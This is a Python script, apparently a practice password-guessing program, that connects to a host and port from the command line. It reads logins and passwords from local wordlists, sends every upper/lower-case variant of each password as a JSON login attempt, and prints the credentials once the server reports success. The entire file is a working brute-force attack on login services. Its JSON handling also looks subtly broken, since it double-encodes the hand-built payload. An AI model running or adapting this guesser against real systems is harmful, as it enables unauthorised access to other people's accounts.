import socket
import sys
import itertools as it
import json

args = sys.argv
my_socket = socket.socket()
my_socket.connect((args[1], int(args[2])))


def password_guess():
    flag = 0
    with open("logins.txt", "r", encoding="utf-8") as login_f:
        for log_id in login_f:
            with open("passwords.txt", "r", encoding="utf-8") as f:
                for line in f:
                    _01 = "01"
                    guessing_word = line.strip()
                    for guess in it.product(_01, repeat=len(guessing_word)):
                        password = ""
                        for i in range(len(guessing_word)):
                            if guess[i] == "1":
                                password += guessing_word[i].upper()
                            else:
                                password += guessing_word[i]
                        id_pass = '{' + f'"login": "{log_id.strip()}", "password": "{password}"' + '}'
                        #print(id_pass)
                        id_pass = json.dumps(id_pass)
                        my_socket.send(id_pass.encode())
                        response = my_socket.recv(1024)
                        response = json.loads(response.decode())
                        if "Connection success!" in response:
                            print(json.loads(id_pass))
                            flag = 1
                            break
                    if flag == 1:
                        break
                if flag == 1:
                    break


password_guess()
my_socket.close()
